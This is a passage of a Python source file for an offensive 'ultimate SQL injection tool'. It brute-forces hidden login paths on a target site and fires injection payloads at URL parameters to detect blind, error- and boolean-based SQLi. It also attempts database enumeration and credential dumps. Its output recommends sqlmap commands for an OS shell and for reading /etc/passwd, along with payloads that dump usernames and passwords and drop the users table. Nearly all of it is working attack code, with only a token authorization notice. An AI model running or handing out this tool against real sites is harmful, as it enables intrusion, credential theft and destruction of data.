            full_url = base_url + path if path.startswith('/') else path.replace('example.com', base_url.split('//')[1].split('/')[0])
            try:
                response = self.session.get(full_url, timeout=3, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403, 401]:
                    return f"[+] {response.status_code}: {full_url}"
            except:
                pass
            return None
        
        # Use ThreadPoolExecutor for faster scanning
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_path, path) for path in self.hidden_paths]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    print(result)
        
        print(f"\n[+] Found {len(found)} hidden pages")
        return found

    def option2_extract_credentials(self):
        """Option 2: Extract users, passwords, emails like sqlmap"""
        print(f"\n[+] Extracting credentials from {self.target_url}")
        
        # Test each parameter in URL
        url_parts = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(url_parts.query)
        
        for param in query_params:
            print(f"\n[+] Testing parameter: {param}")
            
            # Test for SQL injection vulnerability first
            test_payloads = [
                f"' OR '1'='1",
                f"' UNION SELECT NULL,NULL--",
                f"' AND SLEEP(5)--"
            ]
            
            for payload in test_payloads:
                test_url = self.target_url.replace(
                    f"{param}={query_params[param][0]}",
                    f"{param}={urllib.parse.quote(payload)}"
                )
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    # Check for time-based vulnerability
                    if elapsed > 4:
                        print(f"  [!] Time-based SQLi detected with payload: {payload}")
                        self.vulnerable_params.append((param, 'time-based'))
                    
                    # Check for error-based vulnerability
                    if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error', 'warning']):
                        print(f"  [!] Error-based SQLi detected with payload: {payload}")
                        self.vulnerable_params.append((param, 'error-based'))
                    
                except Exception as e:
                    continue
            
            # If vulnerable, try to extract data
            if any(param in vp for vp in self.vulnerable_params):
                print(f"  [+] Parameter {param} appears vulnerable. Attempting extraction...")
                
                # Extract database version
                for payload in self.extraction_payloads['version']:
                    extract_url = self.target_url.replace(
                        f"{param}={query_params[param][0]}",
                        f"{param}={urllib.parse.quote(payload)}"
                    )
                    try:
                        response = self.session.get(extract_url, timeout=5)
                        if response.status_code == 200:
                            # Simple extraction logic - in real tool would parse response better
                            print(f"    [+] Possible version info in response")
                    except:
                        pass

    def option3_mass_injection(self):
        """Option 3: Test with 200+ injection payloads"""
        print(f"\n[+] Mass injection testing with {len(self.payloads)} payloads")
        
        url_parts = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(url_parts.query)
        
        vulnerable_count = 0
        
        for param in query_params:
            print(f"\n[+] Testing parameter: {param}")
            
            # Test first 50 payloads initially
            test_payloads = self.payloads[:50]
            
            for i, payload in enumerate(test_payloads, 1):
                test_url = self.target_url.replace(
                    f"{param}={query_params[param][0]}",
                    f"{param}={urllib.parse.quote(payload)}"
                )
                
                try:
                    # Time-based detection
                    if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'BENCHMARK' in payload.upper():
                        start_time = time.time()
                        self.session.get(test_url, timeout=15)
                        elapsed = time.time() - start_time
                        
                        if elapsed > 4:
                            print(f"  [!] Payload {i}: Time delay detected ({elapsed:.2f}s)")
                            vulnerable_count += 1
                            continue
                    
                    # Regular request for error/boolean detection
                    response = self.session.get(test_url, timeout=5)
                    
                    # Error-based detection
                    error_indicators = [
                        'sql', 'mysql', 'syntax', 'error', 'warning',
                        'exception', 'postgresql', 'oracle', 'microsoft',
                        'odbc', 'driver', 'invalid', 'unclosed'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        print(f"  [!] Payload {i}: SQL error in response")
                        vulnerable_count += 1
                    
                    # Check for different responses (boolean-based)
                    original_url = self.target_url
                    original_response = self.session.get(original_url, timeout=5).text
                    
                    if response.text != original_response:
                        if len(response.text) > 100:  # Simple heuristic
                            print(f"  [!] Payload {i}: Different response detected (boolean-based)")
                            vulnerable_count += 1
                            
                except Exception as e:
                    if 'timeout' in str(e).lower():
                        print(f"  [!] Payload {i}: Timeout (possible blind SQLi)")
                        vulnerable_count += 1
        
        print(f"\n[+] Total potential vulnerabilities found: {vulnerable_count}")

    def option4_blind_sql(self):
        """Option 4: Advanced blind SQL injection"""
        print(f"\n[+] Starting aggressive blind SQL injection")
        
        # This is a simplified blind SQL function
        # In a real tool, this would be much more sophisticated
        
        def blind_extraction(param, original_value):
            print(f"  [+] Attempting blind extraction on parameter: {param}")
            
            # Test for time-based blind
            time_payloads = [
                f"' AND SLEEP(5)--",
                f"' OR SLEEP(5)--",
                f"'; WAITFOR DELAY '00:00:05'--"
            ]
            
            for payload in time_payloads:
                test_url = self.target_url.replace(
                    f"{param}={original_value}",
                    f"{param}={urllib.parse.quote(payload)}"
                )
                
                try:
                    start_time = time.time()
                    self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if elapsed > 4:
                        print(f"    [!] Time-based blind SQL confirmed ({elapsed:.2f}s)")
                        return True
                except:
                    pass
            
            return False
        
        # Test each parameter
        url_parts = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(url_parts.query)
        
        for param in query_params:
            if blind_extraction(param, query_params[param][0]):
                print(f"  [!] Parameter {param} is vulnerable to blind SQL injection")

    def option5_full_enumeration(self):
        """Option 5: Full database enumeration"""
        print(f"\n[+] Starting full database enumeration")
        
        # This would enumerate:
        # 1. Database version
        # 2. Current user
        # 3. Database name
        # 4. All tables
        # 5. All columns
        # 6. Data extraction
        
        enumeration_steps = [
            ("Database Version", self.extraction_payloads['version']),
            ("Current User", self.extraction_payloads['user']),
            ("Database Name", self.extraction_payloads['database']),
            ("Tables", self.extraction_payloads['tables']),
            ("Columns in 'users' table", self.extraction_payloads['columns']),
            ("User Credentials", self.extraction_payloads['dump_users'])
        ]
        
        url_parts = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(url_parts.query)
        
        for param in query_params:
            print(f"\n[+] Enumerating via parameter: {param}")
            
            for step_name, payloads in enumeration_steps:
                print(f"  [+] {step_name}...")
                
                for payload in payloads[:2]:  # Try first 2 payloads for each step
                    test_url = self.target_url.replace(
                        f"{param}={query_params[param][0]}",
                        f"{param}={urllib.parse.quote(payload)}"
                    )
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        if response.status_code == 200 and len(response.text) > 0:
                            # Extract useful info (simplified)
                            print(f"    [+] Possible data found in response")
                            break
                    except:
                        continue

    def option6_automated_exploitation(self):
        """Option 6: Automated exploitation"""
        print(f"\n[+] Starting automated exploitation")
        
        # Generate sqlmap-like commands
        commands = [
            f"sqlmap -u \"{self.target_url}\" --batch --random-agent",
            f"sqlmap -u \"{self.target_url}\" --batch --dbs",
            f"sqlmap -u \"{self.target_url}\" --batch --current-db",
            f"sqlmap -u \"{self.target_url}\" --batch --tables",
            f"sqlmap -u \"{self.target_url}\" --batch -D <database> -T users --columns",
            f"sqlmap -u \"{self.target_url}\" --batch -D <database> -T users -C username,password,email --dump",
            f"sqlmap -u \"{self.target_url}\" --batch --os-shell",
            f"sqlmap -u \"{self.target_url}\" --batch --file-read=/etc/passwd"
        ]
        
        print("[+] Recommended sqlmap commands:")
        for cmd in commands:
            print(f"  {cmd}")
        
        print("\n[+] Quick exploitation payloads:")
        quick_exploit = [
            "' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",
            "' UNION SELECT NULL,@@version--",
            "'; DROP TABLE users--"
        ]
        
        for payload in quick_exploit:
            print(f"  {payload}")

    def run_all_options(self):
        """Run all options aggressively"""
        print("\n" + "="*80)
        print("ULTIMATE SQL INJECTION TOOL - AGGRESSIVE MODE")
        print("="*80)
        
        # Run all options
        self.option1_find_hidden_login()
        self.option2_extract_credentials()
        self.option3_mass_injection()
        self.option4_blind_sql()
        self.option5_full_enumeration()
        self.option6_automated_exploitation()
        
        print("\n" + "="*80)
        print("[+] AGGRESSIVE SCAN COMPLETE")
        print("[+] Use sqlmap for deeper exploitation")
        print("[!] FOR AUTHORIZED TESTING ONLY")
        print("="*80)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ultimate_sql_tool.py <target_url>")
        print("Example: python3 ultimate_sql_tool.py \"http://example.com/page.php?id=1\"")
        print("\nOptions available in the tool:")
        print("  1. Find hidden login pages (200+ paths)")
        print("  2. Extract users/passwords/emails (sqlmap style)")
        print("  3. Test 200+ injection payloads")
        print("  4. Advanced blind SQL injection")
        print("  5. Full database enumeration")
        print("  6. Automated exploitation")
        print("  7. Run ALL options aggressively")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        print("[!] Invalid URL. Please include http:// or https://")
        sys.exit(1)
    
    tool = UltimateSQLInjector(target_url)
    
    if len(sys.argv) > 2:
        option = sys.argv[2]
        if option == "1":
            tool.option1_find_hidden_login()
        elif option == "2":
            tool.option2_extract_credentials()
        elif option == "3":
            tool.option3_mass_injection()
        elif option == "4":
            tool.option4_blind_sql()
        elif option == "5":
            tool.option5_full_enumeration()
        elif option == "6":
            tool.option6_automated_exploitation()
        else:
            print("[!] Invalid option. Use 1-6 or no option for all.")
    else:
        # Run all options
        tool.run_all_options()

if __name__ == "__main__":
    main()